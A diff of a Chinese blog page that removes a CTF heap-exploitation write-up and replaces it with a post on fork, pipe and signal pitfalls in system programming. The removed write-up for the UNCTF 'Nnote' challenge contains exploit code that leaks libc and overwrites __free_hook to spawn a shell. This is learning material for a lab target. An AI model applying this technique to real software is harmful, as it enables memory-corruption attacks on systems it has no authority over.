@@ -4,7 +4,7 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <meta http-equiv="X-UA-Compatible" content="ie=edge" />
-    <title>pwn堆题整理 | Iluvata&#39;s Blog</title>
+    <title>系统编程安全--多进程 | Iluvata&#39;s Blog</title>
 
     
 
@@ -19,34 +19,24 @@
 
 <meta name="generator" content="Hugo 0.87.0" />
 
-<link rel="canonical" href="https://iluvata.github.io/post/2021-12-23_heap/" />
+<link rel="canonical" href="https://iluvata.github.io/post/2024-01-21_safety_multiprocessing/" />
 
 
-<meta property="og:title" content="pwn堆题整理" />
-<meta property="og:description" content="堆溢出  Nnote  花了一周打的UNCTF，光做PWN了，做了7道，就差这道堆题没做出来。最后还有30名以内。。。因为这比赛本身就是入门级的，算是我第一次实战吧。赛后看着wp调试出来。当时应该是找到了漏洞点，但因为基础薄弱最终也没做出来，更别说环境还弄了半天没弄好。。。通过这道题我算是实际开始入门堆了吧。这里是官方wp。
-exp环境  题目给的libc是2.31
-patchelf --set-rpath ~/glibc-all-in-one/libs/2.31 ./Nnote patchelf --set-interpreter ~/glibc-all-in-one/libs/2.31/ld-2.31.so ./Nnote    泄漏libc  从libc-2.26开始加入了TCache，2.28加入对TCache二次释放的检查. TCache为每个线程加入64个单链表的bins，（64bit系统）以16字节递增，从24B到1032B。每个bins最多放7个chunk。堆开头的0x250的堆块就是tcache_perthread_struct. 在free时，如果chunk大小符合要求，就会在放入fastbins之前放入tcache。分配堆块时若从fastbins中成功返回一个chunk，对应fastbins中其他chunk会被放入对应tcache直到装满。small bins中情况类似。chunk合并时chunk会优先放入tcache。tcache中chunk的PREV_INUSE位和在fastbins中一样不会被清零，因此不会被合并。
- 因此这题需要先构造出大于0x410(1040B)的堆块，释放进unsorted bin。需要注意在想释放的堆块后还要再申请一块chunk，防止因为和topchunk相邻而直接合并进topchunk。unsorted bin中如果只有一个chunk，并且这个chunk在上次分配时被使用过时，若申请一个大小属于small bins(32B-1008B)的空间，会直接从该chunk中进行切割，切出低地址部分返回。
- 这题申请大小限制不小于0，不大于128，并且根据申请的大小限制了修改时能写入的字节数。但是申请0B的堆块时能通过整数溢出绕过限制条件引起堆溢出。因此这里构造大小为0x480的chunk的方法就是构造9个连在一起的，大小为0x80的chunk（malloc申请的大小为0x78）；然后利用最上面堆块上面的堆溢出覆盖第一块的块大小字段为0x481（块大小字段最低bit为PREV_INUSE）。释放后再申请一个0x80的chunk，会从之前释放到unsorted bin头部割出0x80，导致现在在unsorted bin中的chunk和原来申请的9块中的第二块重叠，输出第二块的数据就可以得到unsorted bin。
-add(0) for i in range(9): add(0x78) add(0x18) edit(0 , &#39;a&#39;*0x18&#43;p64(0x481)) delete(1) add(0x78) show(2) __malloc_hook = l64() - 0x70 libc.address = __malloc_hook - libc.sym[&#39;__malloc_hook&#39;]   得到的地址和main_arena(或__malloc_hook)之间的偏移是固定的。可以在gdb调试里看到与__malloc_hook之间的偏移为0x70。
-gef➤ bins tcachebins empty fastbins 0x20: 0x0 0x30: 0x0 0x40: 0x0 0x50: 0x0 0x60: 0x0 0x70: 0x0 0x80: 0x0 unsortedbin all: 0x558be3001330 —▸ 0x7f6c92886be0 (main_arena&#43;96) ◂— 0x558be3001330 smallbins empty largebins empty gef➤ x/gx &amp;__malloc_hook 0x7f6c92886b70 &lt;__malloc_hook&gt;:	0x0000000000000000    劫持free_hook  这时候申请两个0x40的chunk，序号分别为11和12." />
+<meta property="og:title" content="系统编程安全--多进程" />
+<meta property="og:description" content="fork  unexpected child  int createChildAndSayHello() { pid_t pid = fork(); if (pid == 0) { sayHello(); return 0; } waitpid(pid); }   这里不是在main中调用fork， return后回到的是main函数或者调用函数，并没有退出子进程。类似的错误还有在处理fork多个child时不恰当的循环导致子进程也fork出预期外的孙子进程。
+  fork 与多线程混合使用可能出现的问题  pid_t pid = fork(); if (pid == 0){ const char** args = malloc(sizeof(char *) * num_args); // Note: On execvp, all memory will be freed.  execvp(args[0], args); // If execvp failed, free memory and exit.  free(args); exit(1); }   fork 后子进程的内存状态与父进程一样，包括堆栈和锁。fork只会复制当前线程。如果fork时有别的线程获得了malloc锁，fork后的malloc锁不能解除。fork时malloc会处于不安全状态吗？" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://iluvata.github.io/post/2021-12-23_heap/" /><meta property="article:section" content="post" />
-<meta property="article:published_time" content="2021-12-23T14:55:04+08:00" />
-<meta property="article:modified_time" content="2021-12-23T14:55:04+08:00" />
+<meta property="og:url" content="https://iluvata.github.io/post/2024-01-21_safety_multiprocessing/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2024-01-21T15:10:06+08:00" />
+<meta property="article:modified_time" content="2024-01-21T15:10:06+08:00" />
 
 
 
 
 <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="pwn堆题整理"/>
-<meta name="twitter:description" content="堆溢出  Nnote  花了一周打的UNCTF，光做PWN了，做了7道，就差这道堆题没做出来。最后还有30名以内。。。因为这比赛本身就是入门级的，算是我第一次实战吧。赛后看着wp调试出来。当时应该是找到了漏洞点，但因为基础薄弱最终也没做出来，更别说环境还弄了半天没弄好。。。通过这道题我算是实际开始入门堆了吧。这里是官方wp。
-exp环境  题目给的libc是2.31
-patchelf --set-rpath ~/glibc-all-in-one/libs/2.31 ./Nnote patchelf --set-interpreter ~/glibc-all-in-one/libs/2.31/ld-2.31.so ./Nnote    泄漏libc  从libc-2.26开始加入了TCache，2.28加入对TCache二次释放的检查. TCache为每个线程加入64个单链表的bins，（64bit系统）以16字节递增，从24B到1032B。每个bins最多放7个chunk。堆开头的0x250的堆块就是tcache_perthread_struct. 在free时，如果chunk大小符合要求，就会在放入fastbins之前放入tcache。分配堆块时若从fastbins中成功返回一个chunk，对应fastbins中其他chunk会被放入对应tcache直到装满。small bins中情况类似。chunk合并时chunk会优先放入tcache。tcache中chunk的PREV_INUSE位和在fastbins中一样不会被清零，因此不会被合并。
- 因此这题需要先构造出大于0x410(1040B)的堆块，释放进unsorted bin。需要注意在想释放的堆块后还要再申请一块chunk，防止因为和topchunk相邻而直接合并进topchunk。unsorted bin中如果只有一个chunk，并且这个chunk在上次分配时被使用过时，若申请一个大小属于small bins(32B-1008B)的空间，会直接从该chunk中进行切割，切出低地址部分返回。
- 这题申请大小限制不小于0，不大于128，并且根据申请的大小限制了修改时能写入的字节数。但是申请0B的堆块时能通过整数溢出绕过限制条件引起堆溢出。因此这里构造大小为0x480的chunk的方法就是构造9个连在一起的，大小为0x80的chunk（malloc申请的大小为0x78）；然后利用最上面堆块上面的堆溢出覆盖第一块的块大小字段为0x481（块大小字段最低bit为PREV_INUSE）。释放后再申请一个0x80的chunk，会从之前释放到unsorted bin头部割出0x80，导致现在在unsorted bin中的chunk和原来申请的9块中的第二块重叠，输出第二块的数据就可以得到unsorted bin。
-add(0) for i in range(9): add(0x78) add(0x18) edit(0 , &#39;a&#39;*0x18&#43;p64(0x481)) delete(1) add(0x78) show(2) __malloc_hook = l64() - 0x70 libc.address = __malloc_hook - libc.sym[&#39;__malloc_hook&#39;]   得到的地址和main_arena(或__malloc_hook)之间的偏移是固定的。可以在gdb调试里看到与__malloc_hook之间的偏移为0x70。
-gef➤ bins tcachebins empty fastbins 0x20: 0x0 0x30: 0x0 0x40: 0x0 0x50: 0x0 0x60: 0x0 0x70: 0x0 0x80: 0x0 unsortedbin all: 0x558be3001330 —▸ 0x7f6c92886be0 (main_arena&#43;96) ◂— 0x558be3001330 smallbins empty largebins empty gef➤ x/gx &amp;__malloc_hook 0x7f6c92886b70 &lt;__malloc_hook&gt;:	0x0000000000000000    劫持free_hook  这时候申请两个0x40的chunk，序号分别为11和12."/>
+<meta name="twitter:title" content="系统编程安全--多进程"/>
+<meta name="twitter:description" content="fork  unexpected child  int createChildAndSayHello() { pid_t pid = fork(); if (pid == 0) { sayHello(); return 0; } waitpid(pid); }   这里不是在main中调用fork， return后回到的是main函数或者调用函数，并没有退出子进程。类似的错误还有在处理fork多个child时不恰当的循环导致子进程也fork出预期外的孙子进程。
+  fork 与多线程混合使用可能出现的问题  pid_t pid = fork(); if (pid == 0){ const char** args = malloc(sizeof(char *) * num_args); // Note: On execvp, all memory will be freed.  execvp(args[0], args); // If execvp failed, free memory and exit.  free(args); exit(1); }   fork 后子进程的内存状态与父进程一样，包括堆栈和锁。fork只会复制当前线程。如果fork时有别的线程获得了malloc锁，fork后的malloc锁不能解除。fork时malloc会处于不安全状态吗？"/>
 
 
 <link rel="stylesheet" href="/css/semantic.min.css" />
@@ -122,7 +112,7 @@ gef➤ bins tcachebins empty fastbins 0x20: 0x0 0x30: 0x0 0x40: 0x0 0x50: 0x0 0x
     <section class="ui top attached segment">
       <header>
         <h1 class="ui large header">
-          pwn堆题整理
+          系统编程安全--多进程
           <div class="sub header">
             @
             
@@ -130,14 +120,14 @@ gef➤ bins tcachebins empty fastbins 0x20: 0x0 0x30: 0x0 0x40: 0x0 0x50: 0x0 0x
             
 
             | 
-                Thursday, Dec 23, 2021
+                Sunday, Jan 21, 2024
               
 
             | 1 minutes read
 
             | Update at
               
-                Thursday, Dec 23, 2021
+                Sunday, Jan 21, 2024
               
           </div>
         </h1>
@@ -146,119 +136,96 @@ gef➤ bins tcachebins empty fastbins 0x20: 0x0 0x30: 0x0 0x40: 0x0 0x50: 0x0 0x
       <article class="main">
 <div id="outline-container-headline-1" class="outline-2">
 <h2 id="headline-1">
-堆溢出
+fork
 </h2>
 <div id="outline-text-headline-1" class="outline-text-2">
 <div id="outline-container-headline-2" class="outline-3">
 <h3 id="headline-2">
-<a href="https://ctf.unctf.com/#/train">Nnote</a>
+unexpected child
 </h3>
 <div id="outline-text-headline-2" class="outline-text-3">
-<p>花了一周打的UNCTF，光做PWN了，做了7道，就差这道堆题没做出来。最后还有30名以内。。。因为这比赛本身就是入门级的，算是我第一次实战吧。赛后看着wp调试出来。当时应该是找到了漏洞点，但因为基础薄弱最终也没做出来，更别说环境还弄了半天没弄好。。。通过这道题我算是实际开始入门堆了吧。<a href="https://www.ctfwp.com/%E5%AE%98%E6%96%B9%E8%B5%9B%E4%BA%8B%E9%A2%98/2021UNCTF">这里</a>是官方wp。</p>
-<div id="outline-container-headline-3" class="outline-4">
-<h4 id="headline-3">
-exp环境
-</h4>
-<div id="outline-text-headline-3" class="outline-text-4">
-<p>题目给的libc是2.31</p>
-<div class="src src-shell">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">patchelf --set-rpath ~/glibc-all-in-one/libs/2.31 ./Nnote
-patchelf --set-interpreter ~/glibc-all-in-one/libs/2.31/ld-2.31.so ./Nnote</code></pre></div>
-</div>
-</div>
-</div>
-<div id="outline-container-headline-4" class="outline-4">
-<h4 id="headline-4">
-泄漏libc
-</h4>
-<div id="outline-text-headline-4" class="outline-text-4">
-<p>从libc-2.26开始加入了TCache，2.28加入对TCache二次释放的检查. TCache为每个线程加入64个单链表的bins，（64bit系统）以16字节递增，从24B到1032B。每个bins最多放7个chunk。堆开头的0x250的堆块就是tcache_perthread_struct. 在free时，如果chunk大小符合要求，就会在放入fastbins之前放入tcache。分配堆块时若从fastbins中成功返回一个chunk，对应fastbins中其他chunk会被放入对应tcache直到装满。small bins中情况类似。chunk合并时chunk会优先放入tcache。tcache中chunk的PREV_INUSE位和在fastbins中一样不会被清零，因此不会被合并。</p>
-<p>
-因此这题需要先构造出大于0x410(1040B)的堆块，释放进unsorted bin。需要注意在想释放的堆块后还要再申请一块chunk，防止因为和topchunk相邻而直接合并进topchunk。unsorted bin中如果只有一个chunk，并且这个chunk在上次分配时被使用过时，若申请一个大小属于small bins(32B-1008B)的空间，会直接从该chunk中进行切割，切出低地址部分返回。</p>
-<p>
-这题申请大小限制不小于0，不大于128，并且根据申请的大小限制了修改时能写入的字节数。但是申请0B的堆块时能通过整数溢出绕过限制条件引起堆溢出。因此这里构造大小为0x480的chunk的方法就是构造9个连在一起的，大小为0x80的chunk（malloc申请的大小为0x78）；然后利用最上面堆块上面的堆溢出覆盖第一块的块大小字段为0x481（块大小字段最低bit为PREV_INUSE）。释放后再申请一个0x80的chunk，会从之前释放到unsorted bin头部割出0x80，导致现在在unsorted bin中的chunk和原来申请的9块中的第二块重叠，输出第二块的数据就可以得到unsorted bin。</p>
-<div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    add(<span style="color:#ae81ff">0</span>)
-    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">9</span>):
-        add(<span style="color:#ae81ff">0x78</span>)
-    add(<span style="color:#ae81ff">0x18</span>)
-
-    edit(<span style="color:#ae81ff">0</span> , <span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x18</span><span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x481</span>))
-    delete(<span style="color:#ae81ff">1</span>)
-    add(<span style="color:#ae81ff">0x78</span>)
-    show(<span style="color:#ae81ff">2</span>)
-    __malloc_hook <span style="color:#f92672">=</span> l64() <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x70</span>
-    libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> __malloc_hook <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;__malloc_hook&#39;</span>]</code></pre></div>
+<div class="src src-c">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">createChildAndSayHello</span>() {
+    pid_t pid <span style="color:#f92672">=</span> fork();
+    <span style="color:#66d9ef">if</span> (pid <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+        sayHello();
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+    }
+    waitpid(pid);
+}</code></pre></div>
 </div>
 <p>
-得到的地址和main_arena(或__malloc_hook)之间的偏移是固定的。可以在gdb调试里看到与__malloc_hook之间的偏移为0x70。</p>
-<div class="src src-text">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">gef➤  bins
-tcachebins
-empty
-fastbins
-0x20: 0x0
-0x30: 0x0
-0x40: 0x0
-0x50: 0x0
-0x60: 0x0
-0x70: 0x0
-0x80: 0x0
-unsortedbin
-all: 0x558be3001330 —▸ 0x7f6c92886be0 (main_arena+96) ◂— 0x558be3001330
-smallbins
-empty
-largebins
-empty
-gef➤  x/gx &amp;__malloc_hook
-0x7f6c92886b70 &lt;__malloc_hook&gt;:	0x0000000000000000</code></pre></div>
+这里不是在main中调用fork， return后回到的是main函数或者调用函数，并没有退出子进程。类似的错误还有在处理fork多个child时不恰当的循环导致子进程也fork出预期外的孙子进程。</p>
 </div>
 </div>
+<div id="outline-container-headline-3" class="outline-3">
+<h3 id="headline-3">
+fork 与多线程混合使用可能出现的问题
+</h3>
+<div id="outline-text-headline-3" class="outline-text-3">
+<div class="src src-c">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">pid_t pid <span style="color:#f92672">=</span> fork();
+<span style="color:#66d9ef">if</span> (pid <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>){
+    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">**</span> args <span style="color:#f92672">=</span> malloc(<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>) <span style="color:#f92672">*</span> num_args);
+    <span style="color:#75715e">// Note: On execvp, all memory will be freed.
+</span><span style="color:#75715e"></span>    execvp(args[<span style="color:#ae81ff">0</span>], args);
+    <span style="color:#75715e">// If execvp failed, free memory and exit.
+</span><span style="color:#75715e"></span>    free(args);
+    exit(<span style="color:#ae81ff">1</span>);
+}</code></pre></div>
 </div>
-<div id="outline-container-headline-5" class="outline-4">
-<h4 id="headline-5">
-劫持free_hook
-</h4>
-<div id="outline-text-headline-5" class="outline-text-4">
-<p>这时候申请两个0x40的chunk，序号分别为11和12. 从unsorted bin中分割出2个chunk，11号chunk和2号chunk重叠。先后释放12和11进入fastbins，修改2号内容即修改fastbins中对应大小的第一块的fd和bk。在fd字段（数据区前8B）写入 <code class="verbatim">__free_hook - 8</code> ，申请一个0x40的chunk后再申请一个0x40的chunk，拿到的伪造块的地址就是__free_hook - 8. 修改12号内容，前8B写入 <code class="verbatim">/bin/sh\x00</code> ，为伪造的调用free的参数；后8B为 <code class="verbatim">system_str</code> 覆盖__free_hook。最后free掉12号块即用伪造的参数调用free，执行 <code class="verbatim">system(&#34;/bin/sh\x00&#34;)</code> .</p>
-<div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    system_addr <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>]
-    __free_hook <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;__free_hook&#39;</span>]
-
-    add(<span style="color:#ae81ff">0x38</span>)
-    add(<span style="color:#ae81ff">0x38</span>)
-    delete(<span style="color:#ae81ff">12</span>)
-    delete(<span style="color:#ae81ff">11</span>)
-
-    edit(<span style="color:#ae81ff">2</span>,p64(__free_hook <span style="color:#f92672">-</span> <span style="color:#ae81ff">8</span>))
-    add(<span style="color:#ae81ff">0x38</span>)
-    add(<span style="color:#ae81ff">0x38</span>)
-    edit(<span style="color:#ae81ff">12</span>, flat( <span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> , system_addr))
-    delete(<span style="color:#ae81ff">12</span>)
-
-    p<span style="color:#f92672">.</span>interactive()</code></pre></div>
+<p>
+fork 后子进程的内存状态与父进程一样，包括堆栈和锁。fork只会复制当前线程。如果fork时有别的线程获得了malloc锁，fork后的malloc锁不能解除。fork时malloc会处于不安全状态吗？</p>
+<p>
+结论：fork后不要再使用当前memory，直接exec。fork 与 exec 分为两个系统调用是为了方便重新分配pipe等。</p>
 </div>
 </div>
 </div>
 </div>
-</div>
-</div>
-</div>
-<div id="outline-container-headline-6" class="outline-2">
-<h2 id="headline-6">
-UAF
+<div id="outline-container-headline-4" class="outline-2">
+<h2 id="headline-4">
+pipe
 </h2>
+<div id="outline-text-headline-4" class="outline-text-2">
+<div class="src src-c">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">if</span> (close(fds[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)) {
+    printf(<span style="color:#e6db74">&#34;Error closing!&#34;</span>);
+}</code></pre></div>
+</div>
+<p>
+should be <code class="verbatim">close(fds[1])</code>. 由于fds是 int[] ，容易类型混淆。
+除此之外，两个进程之间pipe处理不好可能导致死锁。</p>
+</div>
+</div>
+<div id="outline-container-headline-5" class="outline-2">
+<h2 id="headline-5">
+signal
+</h2>
+<div id="outline-text-headline-5" class="outline-text-2">
+<p>signal() is dead.  use sigaction(). 可移植性问题。存在未定义行为。</p>
+<div class="src src-c">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">handler</span>(<span style="color:#66d9ef">int</span> sig) {
+ printf(<span style="color:#e6db74">&#34;Hehe, not exiting!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+}
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+ signal(SIGINT, handler);
+ <span style="color:#66d9ef">while</span> (true) {
+ printf(<span style="color:#e6db74">&#34;Looping...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+ sleep(<span style="color:#ae81ff">1</span>);
+ }
+ <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}</code></pre></div>
+</div>
+<p>
+printf需要锁。如果有signal在main中俄printf获得锁后触发则会死锁。不要在signal handler 中做一些复杂的操作。对并发支持不友好。可以用pipe将signal触发后在一个新线程中处理。线程对并发支持更完善。</p>
+</div>
 </div>
 </article>
     </section>
 
     <footer class="ui attached segment dream-tags" data-html2canvas-ignore>
       
-        
-          <a class="ui label" href="/tags/pwn" title="pwn">pwn</a>
-        
-          <a class="ui label" href="/tags/ctf" title="ctf">ctf</a>
-        
+          <a class="ui label">No Tags</a>
       
       <div
         class="ui label"
@@ -283,21 +250,17 @@ UAF
       <div class="ui segment toc">
         <nav id="TableOfContents">
 <ul>
-<li><a href="#headline-1">堆溢出</a>
+<li><a href="#headline-1">fork</a>
 <ul>
-<li><a href="#headline-2">Nnote</a>
-<ul>
-<li><a href="#headline-3">exp环境</a>
+<li><a href="#headline-2">unexpected child</a>
 </li>
-<li><a href="#headline-4">泄漏libc</a>
-</li>
-<li><a href="#headline-5">劫持free_hook</a>
+<li><a href="#headline-3">fork 与多线程混合使用可能出现的问题</a>
 </li>
 </ul>
 </li>
-</ul>
+<li><a href="#headline-4">pipe</a>
 </li>
-<li><a href="#headline-6">UAF</a>
+<li><a href="#headline-5">signal</a>
 </li>
 </ul>
 </nav>
